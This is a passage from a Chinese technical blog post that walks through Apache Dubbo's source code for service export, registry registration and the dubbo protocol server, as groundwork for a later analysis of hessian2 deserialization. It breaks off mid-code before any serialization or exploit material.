> 原文链接: https://www.anquanke.com//post/id/197658 


# dubbo源码浅析：默认反序列化利用之hessian2


                                阅读量   
                                **958633**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01f3a2a75dfe7dbe90.png)](https://p2.ssl.qhimg.com/t01f3a2a75dfe7dbe90.png)



## 一、前言

官方github描述：

```
Apache Dubbo is a high-performance, java based, open source RPC framework.
```

Apache Dubbo是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。

现在大部分企业开发，无论是微服务架构，还是传统的垂直切分架构，大部分都用到了RPC（远程过程调用），实现分布式的协作，其中有比较简单的RESTful方式的RPC实现，也有自定义协议自成一系的RPC实现，而大部分RPC实现框架都使用了一种或多种序列化方式对传输数据进行序列化以及反序列化。

Apache Dubbo是本篇文章主要讲述的RPC实现框架，我会使用我一贯的源码浅析风格，对其进行原理细节的分析探讨，先从dubbo的简单使用，慢慢引申出其源码架构细节，最后在了解大概原理后，重点分析其默认hessian2序列化实现细节。

我希望您看完这篇文章之后，能对dubbo的大概架构和源码具有比较清晰的理解，以及对序列化、反序列化部分有充分的理解，希望为您学习dubbo源码走少一点弯路，并且能挖掘出dubbo的潜在安全问题，从而完善它，使它更加的健壮更加的安全。



## 二、源码浅析

### <a class="reference-link" name="2.1%20%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"></a>2.1 简单使用

dubbo的使用非常简单，一般普遍使用的是传统的spring方式，不过这种方式使用上没有在spring-boot上使用更便捷。

<a class="reference-link" name="2.1.1%20%E5%90%AF%E5%8A%A8%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%EF%BC%88zookeeper%EF%BC%89"></a>**2.1.1 启动注册中心（zookeeper）**

启动一个本地的zookeeper，端口为2181

<a class="reference-link" name="2.1.2%20%E6%9C%8D%E5%8A%A1%E7%AB%AF"></a>**2.1.2 服务端**

service（接口定义和实现相关）：

```
public class A implements Serializable `{`
  String name = "xxxx";

  public String getName() `{`
    return name;
  `}`

  public void setName(String name) `{`
    this.name = name;
  `}`
`}`
```

```
public interface DemoService `{`

  String hello(A a);
`}`
```

```
public class DemoServiceImpl implements DemoService `{`

  public String hello(A a) `{`
    return "hello! " + a.getName();
  `}`
`}`
```

spring xml配置（dubbo-provider.xml）：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:dubbo="http://code.alibabatech.com/schema/dubbo"
  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"&gt;
  &lt;!-- 提供方应用信息，用于计算依赖关系 --&gt;
  &lt;dubbo:application name="dubbo-service" /&gt;

  &lt;!-- 使用multicast广播注册中心暴露服务地址 --&gt;
  &lt;!-- &lt;dubbo:registry address="multicast://4.5.6.7:1234" /&gt; --&gt;

  &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;
  &lt;dubbo:registry address="zookeeper://127.0.0.1:2181" /&gt;

  &lt;!-- 用dubbo协议在20880端口暴露服务 --&gt;
  &lt;dubbo:protocol name="dubbo" port="20880" /&gt;

  &lt;!-- 声明需要暴露的服务接口 --&gt;
  &lt;dubbo:service interface="com.threedr3am.learn.dubbo.DemoService"
    ref="demoService" /&gt;

  &lt;!-- 和本地bean一样实现服务 --&gt;
  &lt;bean id="demoService" class="com.threedr3am.learn.dubbo.DemoServiceImpl" /&gt;
&lt;/beans&gt;
```

启动jvm创建spring容器（main）:

```
public class Main `{`

  public static void main(String[] args) `{`
    ApplicationContext applicationContext = new ClassPathXmlApplicationContext("dubbo-provider.xml");
  `}`
`}`
```

<a class="reference-link" name="2.1.3%20%E5%AE%A2%E6%88%B7%E7%AB%AF"></a>**2.1.3 客户端**

spring xml配置（dubbo-consumer.xml）：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;beans xmlns="http://www.springframework.org/schema/beans"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:dubbo="http://code.alibabatech.com/schema/dubbo"
  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd"&gt;
  &lt;!-- 提供方应用信息，用于计算依赖关系 --&gt;
  &lt;dubbo:application name="dubbo-service-consumer" /&gt;

  &lt;!-- 使用multicast广播注册中心暴露服务地址 --&gt;
  &lt;!-- &lt;dubbo:registry address="multicast://4.5.6.7:1234" /&gt; --&gt;

  &lt;!-- 使用zookeeper注册中心暴露服务地址 --&gt;
  &lt;dubbo:registry address="zookeeper://127.0.0.1:2181" /&gt;

  &lt;!-- 声明需要暴露的服务接口 --&gt;
  &lt;dubbo:reference id="demoService" interface="com.threedr3am.learn.dubbo.DemoService"/&gt;
&lt;/beans&gt;
```

启动jvm，执行RPC（main）：

```
public class Main `{`

  public static void main(String[] args) `{`
    ApplicationContext applicationContext = new ClassPathXmlApplicationContext("dubbo-consumer.xml");
    DemoService demoService = (DemoService) applicationContext.getBean("demoService");
    System.out.println(demoService.hello(new A()));
  `}`
`}`
```

<a class="reference-link" name="2.1.4%20RPC"></a>**2.1.4 RPC**

在上述注册中心、服务端、客户端依次执行后，可以看到，客户端输出了“hello! threedr3am”

### <a class="reference-link" name="2.2%20%E6%BA%90%E7%A0%81%E8%B7%9F%E8%B8%AA"></a>2.2 源码跟踪

我们以上述spring的使用例子展开，一步一步的跟踪源码的执行流程。

从github clone到dubbo的源码后，可以发现，源码（2.6.x版本）分成了很多module

```
├── dubbo-all
├── dubbo-bom
├── dubbo-bootstrap
├── dubbo-cluster
├── dubbo-common
├── dubbo-compatible
├── dubbo-config
├── dubbo-configcenter
├── dubbo-container
├── dubbo-demo
├── dubbo-dependencies
├── dubbo-dependencies-bom
├── dubbo-distribution
├── dubbo-filter
├── dubbo-metadata
├── dubbo-monitor
├── dubbo-parent.iml
├── dubbo-plugin
├── dubbo-registry
├── dubbo-remoting
├── dubbo-rpc
├── dubbo-serialization
├── dubbo-test
```

接着，我们启动服务端main程序，这里我们略过spring容器的创建细节，因为spring容器的源码。。。这可以写一本书了，我们只从服务端读取解析dubbo-provider.xml配置创建容器后refresh的ServiceBean（dubbo-config中）开始，这里才是真正的dubbo的相关代码起始处。

这边贴一下，服务端程序启动时expose service的执行栈信息：

```
com.alibaba.dubbo.remoting.transport.netty4.NettyTransporter.bind(NettyTransporter.java:32)
com.alibaba.dubbo.remoting.Transporter$Adaptive.bind(Transporter$Adaptive.java)
com.alibaba.dubbo.remoting.Transporters.bind(Transporters.java:56)
com.alibaba.dubbo.remoting.exchange.support.header.HeaderExchanger.bind(HeaderExchanger.java:44)
com.alibaba.dubbo.remoting.exchange.Exchangers.bind(Exchangers.java:70)
com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.createServer(DubboProtocol.java:285)
com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.openServer(DubboProtocol.java:264)
com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol.export(DubboProtocol.java:251)
com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:57)
com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:100)
com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:62)
com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)
com.alibaba.dubbo.registry.integration.RegistryProtocol.doLocalExport(RegistryProtocol.java:172)
com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:135)
com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)
com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)
com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)
com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)
com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:515)
com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:360)
com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:319)
com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:217)
com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:266)
com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:106)
com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)
org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:166)
org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:138)
org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:383)
org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:337)
org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)
org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:545)
org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:139)
org.springframework.context.support.ClassPathXmlApplicationContext.&lt;init&gt;(ClassPathXmlApplicationContext.java:83)
com.threedr3am.learn.dubbo.Main.main(Main.java:12)
```

下一步，我们跟进dubbo-config的子module，也即dubbo-config-spring这个module，从它的com.alibaba.dubbo.config.spring.ServiceBean类开始。

从我们前面贴出来的执行栈信息，跟进com.alibaba.dubbo.config.spring.ServiceBean类的onApplicationEvent方法：

```
@Override
public void onApplicationEvent(ContextRefreshedEvent event) `{`
    if (isDelay() &amp;&amp; !isExported() &amp;&amp; !isUnexported()) `{`
        if (logger.isInfoEnabled()) `{`
            logger.info("The service ready on spring started. service: " + getInterface());
        `}`
        export();
    `}`
`}`
```
- isDelay()：判断服务端，也就是服务提供者provider是否在dubbo:service这个标签配置中配置了delay，若配置了delay值（毫秒为单位），则暴露expose服务会延迟到delay值对应的时间后。若配置了值，isDelay()会返回false，则不执行export()。
- export()：暴露服务到注册中心
接着，跟进export方法：

```
@Override
public void export() `{`
    //重点方法
    super.export();
    // Publish ServiceBeanExportedEvent
    publishExportEvent();
`}`
```

父类的expose方法：

```
public synchronized void export() `{`
    //如果ProviderConfig配置存在，并且export、delay等配置为空，则读取ProviderConfig配置
    if (provider != null) `{`
        if (export == null) `{`
            export = provider.getExport();
        `}`
        if (delay == null) `{`
            delay = provider.getDelay();
        `}`
    `}`
    if (export != null &amp;&amp; !export) `{`
        return;
    `}`
    //若配置了delay延迟暴露，则通过定时调度进行延迟暴露，否则立即暴露服务
    if (delay != null &amp;&amp; delay &gt; 0) `{`
        delayExportExecutor.schedule(new Runnable() `{`
            @Override
            public void run() `{`
                doExport();
            `}`
        `}`, delay, TimeUnit.MILLISECONDS);
    `}` else `{`
        doExport();
    `}`
`}`
```

expose方法做了synchronized同步处理，应该是为了避免并发执行。

doExport方法：

```
protected synchronized void doExport() `{`
    if (unexported) `{`
        throw new IllegalStateException("Already unexported!");
    `}`
    if (exported) `{`
        return;
    `}`
    exported = true;
    if (interfaceName == null || interfaceName.length() == 0) `{`
        throw new IllegalStateException("&lt;dubbo:service interface="" /&gt; interface not allow null!");
    `}`
    checkDefault();
    //...忽略无关重要的细节
    checkApplication();
    checkRegistry();
    checkProtocol();
    appendProperties(this);
    checkStub(interfaceClass);
    checkMock(interfaceClass);
    if (path == null || path.length() == 0) `{`
        path = interfaceName;
    `}`
    doExportUrls();
    ProviderModel providerModel = new ProviderModel(getUniqueServiceName(), this, ref);
    ApplicationModel.initProviderModel(getUniqueServiceName(), providerModel);
`}`
```

这个方法中，大部分逻辑都是对配置信息的检查：
- checkDefault()：检查ProviderConfig是否存在，若不存在，则创建一个新的ProviderConfig，接着，从系统变量中读取相关约定的配置值设置进去。
- checkApplication()：主要检查ApplicationConfig是否存在，若不存在，则和checkDefault()中的处理大体相同。application用于配置dubbo服务的应用信息。
- checkRegistry()：检查RegistryConfig，同上处理，不过RegistryConfig是集合形式，具有多个配置，每一个RegistryConfig都代表一个注册中心配置。
- checkProtocol()：检查ProtocolConfig，同上处理。ProtocolConfig是用于配置dubbo服务RPC所用的协议，一般都是默认使用dubbo协议进行通讯。
- appendProperties(this)：对ServiceConfig进行配置追加处理，从系统变量读取约定key的配置值。
- checkStub(interfaceClass)和checkMock(interfaceClass)：检查service的interface是否满足stub和mock。
- doExportUrls()：暴露服务核心逻辑方法。
doExportUrls()：

```
private void doExportUrls() `{`
    //读取注册中心配置
    List&lt;URL&gt; registryURLs = loadRegistries(true);
    //遍历协议配置，根据协议进行暴露服务
    for (ProtocolConfig protocolConfig : protocols) `{`
        doExportUrlsFor1Protocol(protocolConfig, registryURLs);
    `}`
`}`
```

dubbo的设置，是基于总线模式，也就是它的配置传递，全部都靠URL这个类的实例进行传递，有好处也有坏处，好处是对于一些方法栈比较深的参数传递，在进行代码修改后，不需要修改传递中所涉及到的所有方法，而坏处是，不够直观，URL中到底存有哪些数据参数传递，可读性很差。

loadRegistries(true)：

```
protected List&lt;URL&gt; loadRegistries(boolean provider) `{`
    checkRegistry();
    List&lt;URL&gt; registryList = new ArrayList&lt;URL&gt;();
    //判断注册中心配置是否为空，若是空的，那没必要继续走下去了
    if (registries != null &amp;&amp; !registries.isEmpty()) `{`
        //遍历注册中心配置，读取相关配置信息，每一个对应一个URL存储
        for (RegistryConfig config : registries) `{`
            String address = config.getAddress();
            if (address == null || address.length() == 0) `{`
                address = Constants.ANYHOST_VALUE;
            `}`
            String sysaddress = System.getProperty("dubbo.registry.address");
            if (sysaddress != null &amp;&amp; sysaddress.length() &gt; 0) `{`
                address = sysaddress;
            `}`
            if (address.length() &gt; 0 &amp;&amp; !RegistryConfig.NO_AVAILABLE.equalsIgnoreCase(address)) `{`
                Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();
                appendParameters(map, application);
                appendParameters(map, config);
                map.put("path", RegistryService.class.getName());
                map.put("dubbo", Version.getProtocolVersion());
                map.put(Constants.TIMESTAMP_KEY, String.valueOf(System.currentTimeMillis()));
                if (ConfigUtils.getPid() &gt; 0) `{`
                    map.put(Constants.PID_KEY, String.valueOf(ConfigUtils.getPid()));
                `}`
                if (!map.containsKey("protocol")) `{`
                    if (ExtensionLoader.getExtensionLoader(RegistryFactory.class).hasExtension("remote")) `{`
                        map.put("protocol", "remote");
                    `}` else `{`
                        map.put("protocol", "dubbo");
                    `}`
                `}`
                List&lt;URL&gt; urls = UrlUtils.parseURLs(address, map);
                for (URL url : urls) `{`
                    url = url.addParameter(Constants.REGISTRY_KEY, url.getProtocol());
                    url = url.setProtocol(Constants.REGISTRY_PROTOCOL);
                    if ((provider &amp;&amp; url.getParameter(Constants.REGISTER_KEY, true))
                            || (!provider &amp;&amp; url.getParameter(Constants.SUBSCRIBE_KEY, true))) `{`
                        registryList.add(url);
                    `}`
                `}`
            `}`
        `}`
    `}`
    return registryList;
`}`
```

doExportUrlsFor1Protocol(protocolConfig, registryURLs)：

```
private void doExportUrlsFor1Protocol(ProtocolConfig protocolConfig, List&lt;URL&gt; registryURLs) `{`
    //...代码略多，但基本都不是重点
`}`
```

doExportUrlsFor1Protocol方法中，主要就是做了两件事：
1. 对URL总线配置追加一些配置
1. 对服务实现类进行动态代理，生成invoker，接着使用通讯协议实现类进行服务暴露
服务暴露的主要代码有两处：

```
Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, registryURL.addParameterAndEncoded(Constants.EXPORT_KEY, url.toFullString()));
DelegateProviderMetaDataInvoker wrapperInvoker = new DelegateProviderMetaDataInvoker(invoker, this);

Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);
exporters.add(exporter);
```

```
Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, url);
DelegateProviderMetaDataInvoker wrapperInvoker = new DelegateProviderMetaDataInvoker(invoker, this);

Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);
exporters.add(exporter);
```

这两处基本都是一致的处理，首先通过proxyFactory代理工厂对象对interface进行代理，dubbo中代理工厂实现有两类：
1. javassist
1. jdk proxy
```
org.apache.dubbo.rpc.proxy.javassist.JavassistProxyFactory

org.apache.dubbo.rpc.proxy.jdk.JdkProxyFactory
```

它们位于dubbo-rpc-api这个module的com.alibaba.dubbo.rpc.proxy包底下。

其中它们都具有getProxy、getInvoker方法实现

getProxy：主要用于服务消费者对interface进行代理，生成实例提供程序调用。而InvokerInvocationHandler是实际调用对象，其对上层程序代码隐藏了远程调用的细节

```
public &lt;T&gt; T getProxy(Invoker&lt;T&gt; invoker, Class&lt;?&gt;[] interfaces) `{`
    return (T) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), interfaces, new InvokerInvocationHandler(invoker));
`}`

```

getInvoker：主要用于服务提供者对实际被调用实例进行代理包装，以实现实际对象方法被调用后，进行结果、异常的CompletableFuture的封装

```
@Override
public &lt;T&gt; Invoker&lt;T&gt; getInvoker(T proxy, Class&lt;T&gt; type, URL url) `{`
    return new AbstractProxyInvoker&lt;T&gt;(proxy, type, url) `{`
        @Override
        protected Object doInvoke(T proxy, String methodName,
                                  Class&lt;?&gt;[] parameterTypes,
                                  Object[] arguments) throws Throwable `{`
            Method method = proxy.getClass().getMethod(methodName, parameterTypes);
            return method.invoke(proxy, arguments);
        `}`
    `}`;
`}`
```

也就是说，getProxy方法为服务消费者，也就是RPC的客户端生成代理实例，作为进行RPC的媒介，而getInvoker为服务提供者，也即是RPC的服务端，它的服务实现进行包装。

客户端，也就是服务消费者在执行RPC时，真正执行的是InvokerInvocationHandler的invoke，了解java动态代理的会很清楚，InvokerInvocationHandler包装了真正的RPC实现

InvokerInvocationHandler：

```
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable `{`
    String methodName = method.getName();
    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();
    if (method.getDeclaringClass() == Object.class) `{`
        return method.invoke(invoker, args);
    `}`
    if ("toString".equals(methodName) &amp;&amp; parameterTypes.length == 0) `{`
        return invoker.toString();
    `}`
    if ("hashCode".equals(methodName) &amp;&amp; parameterTypes.length == 0) `{`
        return invoker.hashCode();
    `}`
    if ("equals".equals(methodName) &amp;&amp; parameterTypes.length == 1) `{`
        return invoker.equals(args[0]);
    `}`
    if ("$destroy".equals(methodName) &amp;&amp; parameterTypes.length == 0) `{`
        invoker.destroy();
    `}`

    RpcInvocation rpcInvocation = new RpcInvocation(method, invoker.getInterface().getName(), args);
    rpcInvocation.setTargetServiceUniqueName(invoker.getUrl().getServiceKey());

    return invoker.invoke(rpcInvocation).recreate();
`}`
```

从上述代码可以知道，对于一些方法，默认是不会进行RPC。

AbstractProxyInvoker：

```
public Result invoke(Invocation invocation) throws RpcException `{`
    try `{`
        Object value = doInvoke(proxy, invocation.getMethodName(), invocation.getParameterTypes(), invocation.getArguments());
        CompletableFuture&lt;Object&gt; future = wrapWithFuture(value, invocation);
        CompletableFuture&lt;AppResponse&gt; appResponseFuture = future.handle((obj, t) -&gt; `{`
            AppResponse result = new AppResponse();
            if (t != null) `{`
                if (t instanceof CompletionException) `{`
                    result.setException(t.getCause());
                `}` else `{`
                    result.setException(t);
                `}`
            `}` else `{`
                result.setValue(obj);
            `}`
            return result;
        `}`);
        return new AsyncRpcResult(appResponseFuture, invocation);
    `}` catch (InvocationTargetException e) `{`
        if (RpcContext.getContext().isAsyncStarted() &amp;&amp; !RpcContext.getContext().stopAsync()) `{`
            logger.error("Provider async started, but got an exception from the original method, cannot write the exception back to consumer because an async result may have returned the new thread.", e);
        `}`
        return AsyncRpcResult.newDefaultAsyncResult(null, e.getTargetException(), invocation);
    `}` catch (Throwable e) `{`
        throw new RpcException("Failed to invoke remote proxy method " + invocation.getMethodName() + " to " + getUrl() + ", cause: " + e.getMessage(), e);
    `}`
`}`
```

到此为止的总结是：
- 服务提供者启动时，先创建相应选择的协议对象（Protocol），然后通过代理工厂创建Invoker对象，接着使用协议对象对Invoker进行服务注册至注册中心。
- 服务消费者启动时，先创建相应选择的协议对象（Protocol），然后通过协议对象引用到服务提供者，得到Invoker对象，接着通过代理工厂创建proxy对象。
回到ServiceConfig的doExportUrlsFor1Protocol方法中：

```
Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);
```

从栈信息我们可以知道，其中protocol经过了多层的包装，通过装饰模式进行一些额外功能的加入，从而实现一条链式的执行，包括注册中心注册、协议暴露等。

跟进protocol的注册协议expose实现中（com.alibaba.dubbo.registry.integration.RegistryProtocol#export）：

```
@Override
public &lt;T&gt; Exporter&lt;T&gt; export(final Invoker&lt;T&gt; originInvoker) throws RpcException `{`
    //export invoker
    final ExporterChangeableWrapper&lt;T&gt; exporter = doLocalExport(originInvoker);

    URL registryUrl = getRegistryUrl(originInvoker);

    //registry provider
    //通过SPI的方式，根据URL的配置（dubbo:registry标签配置），获取对应的Registry实例，进行注册到注册中心
    final Registry registry = getRegistry(originInvoker);
    final URL registeredProviderUrl = getRegisteredProviderUrl(originInvoker);

    //to judge to delay publish whether or not
    boolean register = registeredProviderUrl.getParameter("register", true);

    ProviderConsumerRegTable.registerProvider(originInvoker, registryUrl, registeredProviderUrl);

    if (register) `{`
        //注册到注册中心
        register(registryUrl, registeredProviderUrl);
        ProviderConsumerRegTable.getProviderWrapper(originInvoker).setReg(true);
    `}`

    // Subscribe the override data
    // FIXME When the provider subscribes, it will affect the scene : a certain JVM exposes the service and call the same service. Because the subscribed is cached key with the name of the service, it causes the subscription information to cover.
    final URL overrideSubscribeUrl = getSubscribedOverrideUrl(registeredProviderUrl);
    final OverrideListener overrideSubscribeListener = new OverrideListener(overrideSubscribeUrl, originInvoker);
    overrideListeners.put(overrideSubscribeUrl, overrideSubscribeListener);
    //订阅对应的service在注册中心的数据，数据被覆盖修改后，可以得到通知处理
    registry.subscribe(overrideSubscribeUrl, overrideSubscribeListener);
    //Ensure that a new exporter instance is returned every time export
    return new DestroyableExporter&lt;T&gt;(exporter, originInvoker, overrideSubscribeUrl, registeredProviderUrl);
`}`
```

注册到注册中心：

```
public void register(URL registryUrl, URL registedProviderUrl) `{`
    Registry registry = registryFactory.getRegistry(registryUrl);
    registry.register(registedProviderUrl);
`}`
```

实际上，真正的注册到注册中心的实现，被com.alibaba.dubbo.registry.support.FailbackRegistry#register包装了

FailbackRegistry#register：

```
@Override
public void register(URL url) `{`
    super.register(url);
    failedRegistered.remove(url);
    failedUnregistered.remove(url);
    try `{`
        // Sending a registration request to the server side
        doRegister(url);
    `}` catch (Exception e) `{`
        Throwable t = e;

        // If the startup detection is opened, the Exception is thrown directly.
        boolean check = getUrl().getParameter(Constants.CHECK_KEY, true)
                &amp;&amp; url.getParameter(Constants.CHECK_KEY, true)
                &amp;&amp; !Constants.CONSUMER_PROTOCOL.equals(url.getProtocol());
        boolean skipFailback = t instanceof SkipFailbackWrapperException;
        if (check || skipFailback) `{`
            if (skipFailback) `{`
                t = t.getCause();
            `}`
            throw new IllegalStateException("Failed to register " + url + " to registry " + getUrl().getAddress() + ", cause: " + t.getMessage(), t);
        `}` else `{`
            logger.error("Failed to register " + url + ", waiting for retry, cause: " + t.getMessage(), t);
        `}`

        // Record a failed registration request to a failed list, retry regularly
        failedRegistered.add(url);
    `}`
`}`
```

FailbackRegistry实现了一些容错机制的处理。

doRegister的具体实现，因为我们这边配置的是zookeeper注册中心，所以实现类为com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry#doRegister

```
@Override
protected void doRegister(URL url) `{`
    try `{`
        zkClient.create(toUrlPath(url), url.getParameter(Constants.DYNAMIC_KEY, true));
    `}` catch (Throwable e) `{`
        throw new RpcException("Failed to register " + url + " to zookeeper " + getUrl() + ", cause: " + e.getMessage(), e);
    `}`
`}`
```

这边用惯zookeeper的读者，可以清晰的看到，使用了zookeeper的java客户端进行创建节点，也就是完成了对服务的注册到注册中心（zookeeper）。

接着，在装饰模式下，下一步执行的是dubbo协议的暴露服务。

跟进protocol的dubbo协议expose实现中（com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol#export）：

```
@Override
public &lt;T&gt; Exporter&lt;T&gt; export(Invoker&lt;T&gt; invoker) throws RpcException `{`
    //取出URL总线配置
    URL url = invoker.getUrl();

    // export service.
    //根据url配置，生成注册到注册中心的service key
    String key = serviceKey(url);
    //把invoker放到一个集合map中，后续RPC的时候取出调用
    DubboExporter&lt;T&gt; exporter = new DubboExporter&lt;T&gt;(invoker, key, exporterMap);
    exporterMap.put(key, exporter);

    //export an stub service for dispatching event
    Boolean isStubSupportEvent = url.getParameter(Constants.STUB_EVENT_KEY, Constants.DEFAULT_STUB_EVENT);
    Boolean isCallbackservice = url.getParameter(Constants.IS_CALLBACK_SERVICE, false);
    if (isStubSupportEvent &amp;&amp; !isCallbackservice) `{`
        String stubServiceMethods = url.getParameter(Constants.STUB_EVENT_METHODS_KEY);
        if (stubServiceMethods == null || stubServiceMethods.length() == 0) `{`
            if (logger.isWarnEnabled()) `{`
                logger.warn(new IllegalStateException("consumer [" + url.getParameter(Constants.INTERFACE_KEY) +
                        "], has set stubproxy support event ,but no stub methods founded."));
            `}`
        `}` else `{`
            stubServiceMethodsMap.put(url.getServiceKey(), stubServiceMethods);
        `}`
    `}`
    //根据url配置创建服务提供者服务器，接收服务消费者的请求（RPC通讯）
    openServer(url);
    //配置自定义的序列化实现
    optimizeSerialization(url);
    return exporter;
`}`
```

上述代码的核心地方是openServer方法的调用，最终通过它创建一个服务提供者的服务端，用于接收消费者的RPC请求。

```
private void openServer(URL url) `{`
    // find server.
    String key = url.getAddress();
    //client can export a service which's only for server to invoke
    boolean isServer = url.getParameter(Constants.IS_SERVER_KEY, true);
    if (isServer) `{`
        //从缓存读取ExchangeServer，若不存在则创建新的ExchangeServer，并缓存到map中
        ExchangeServer server = serverMap.get(key);
        if (server == null) `{`
            serverMap.put(key, createServer(url));
        `}` else `{`
            //若缓存已存在，则reset重置服务
            // server supports reset, use together with override
            server.reset(url);
        `}`
    `}`
`}`
```

创建服务：

```
private ExchangeServer createServer(URL url) `{`
    //...
    ExchangeServer server;
    try `{`
        server = Exchangers.bind(url, requestHandler);
    `}` catch (RemotingException e) `{`
        throw new RpcException("Fail to start server(url: " + url + ") " + e.getMessage(), e);
    `}`
    //...
`}`
```

从上面的代码可以看到，dubbo中不但广泛地使用URL消息总线模式，还广泛的使用SPI（PS：扩展了Java原生的SPI）

跟进Exchangers.bind(url, requestHandler)方法实现：

```
public static ExchangeServer bind(URL url, ExchangeHandler handler) throws RemotingException `{`
    if (url == null) `{`
        throw new IllegalArgumentException("url == null");
    `}`
    if (handler == null) `{`
        throw new IllegalArgumentException("handler == null");
    `}`
    url = url.addParameterIfAbsent(Constants.CODEC_KEY, "exchange");
    return getExchanger(url).bind(url, handler);
`}`

public static Exchanger getExchanger(URL url) `{`
    String type = url.getParameter(Constants.EXCHANGER_KEY, Constants.DEFAULT_EXCHANGER);
    return getExchanger(type);
`}`
```

根据URL的配置，通过SPI选择Exchanger的实现，执行bind，最后生成ExchangeServer。

Exchangers类中，可以看到有很多重载的bind、connect方法，bind方法返回的是ExchangeServer，connect方法返回的是ExchangeClient，下面是以前阅读dubbo源码做的一些笔记总结：
- ExchangeServer：服务提供者对服务暴露时，使用Protocol对象进行export，export中对其进行Exchangers.bind得到ExchangeServer，其重点为第二个参数ExchangeHandler，其被多个handler进行包装，进行了多层的处理，其为最外层，进行实际实例方法的调用invoke，然后返回Result
- ExchangeClient：服务消费者对服务引用时，使用Protocol对象进行refer，refer中中对其进行Exchangers.connect得到ExchangeClient，然后把其封装在Invoker中，接着Invoker被proxy，当消费者执行Proxy对象方法时，其会通过InvokeInvocationHandler对Invoker进行invoke，然后Invoker调用ExchangeClient进行request，其重点为第二个参数ExchangeHandler，其被多个handler进行包装，进行了多层的处理，其为最外层，对响应进行处理DefaultFuture.received
回到前面，Exchangers.bind时传入的是requestHandler：

```
private ExchangeHandler requestHandler = new ExchangeHandlerAdapter() `{`

    @Override
    public Object reply(ExchangeChannel channel, Object message) throws RemotingException `{`
        if (message instanceof Invocation) `{`
            Invocation inv = (Invocation) message;
            Invoker&lt;?&gt; invoker = getInvoker(channel, inv);
            // need to consider backward-compatibility if it's a callback
            if (Boolean.TRUE.toString().equals(inv.getAttachments().get(IS_CALLBACK_SERVICE_INVOKE))) `{`
                String methodsStr = invoker.getUrl().getParameters().get("methods");
                boolean hasMethod = false;
                if (methodsStr == null || methodsStr.indexOf(",") == -1) `{`
                    hasMethod = inv.getMethodName().equals(methodsStr);
                `}` else `{`
                    String[] methods = methodsStr.split(",");
                    for (String method : methods) `{`
                        if (inv.getMethodName().equals(method)) `{`
                            hasMethod = true;
                            break;
                        `}`
                    `}`
                `}`
                if (!hasMethod) `{`
                    logger.warn(new IllegalStateException("The methodName " + inv.getMethodName()
                            + " not found in callback service interface ,invoke will be ignored."
